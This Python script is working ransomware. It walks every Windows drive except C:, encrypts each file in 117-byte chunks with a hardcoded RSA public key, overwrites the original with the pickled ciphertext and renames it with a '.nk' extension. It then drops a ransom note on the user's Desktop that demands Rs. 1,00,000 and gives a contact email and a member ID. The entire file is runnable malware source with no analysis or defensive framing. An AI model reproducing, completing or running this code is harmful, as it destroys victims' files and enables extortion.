global publicKey
m_id = '1234567891'
publicKey = 'PublicKey(123856659405824364660477649411782045758906835625822655717961389160498175236921222980863613180174697764224713319734635168067299554697122124970909816331138583771057802225905556931084417353032560984842978585659161804011931457077858018765596702552526633000402871052524454021152082253624957827237217402771973264011, 65537)'

import os
import rsa
import pickle

t = publicKey.split(', ')
n = int((t[0])[10:])
e = int((t[1])[:-1])

def encrypt():
    global publicKey

    for part in range(65, 91):
        if part != 67:
            partpath = chr(part) + ":\\"
            for dirpath, dirs, files in os.walk(partpath, topdown = True):
                dirpath = dirpath + "\\"
                for filename in files:
                    i = 0
                    x = {}
                    fname = dirpath + filename
                    if filename != "e" + m_id + ".exe":
                        nfname = fname + ".nk"
                        with open(fname, 'rb') as f:
                            while True:
                                data = f.read(117)
                                if data:
                                    ct = rsa.encrypt(data, rsa.key.PublicKey(n, e))
                                    x[i] = ct
                                    i += 1
                                else:
                                    break
                        try:
                            with open(fname, 'wb') as f:
                                pickle.dump(x, f)
                            os.rename(fname, nfname)
                        except:
                            pass

encrypt()

path = "C:\\Users\\" + os.getlogin() + "\\Desktop\\nk_readme.txt"
with open(path, 'w') as f:
    f.write("YOUR FILES ARE ENCRYPTED !!!\n")
    f.write("WANT TO GAIN ASSCESS AGAIN ?\n")
    f.write("CONTACT US AT tnkrish02@gmail.com WITH YOUR MEMBER ID\n")
    f.write("YOU WILL NEED TO PAY RS. 1,00,000 ONLY\n")
    f.write("MEMEBER ID : ")
    f.write(m_id)
    f.write("\n")
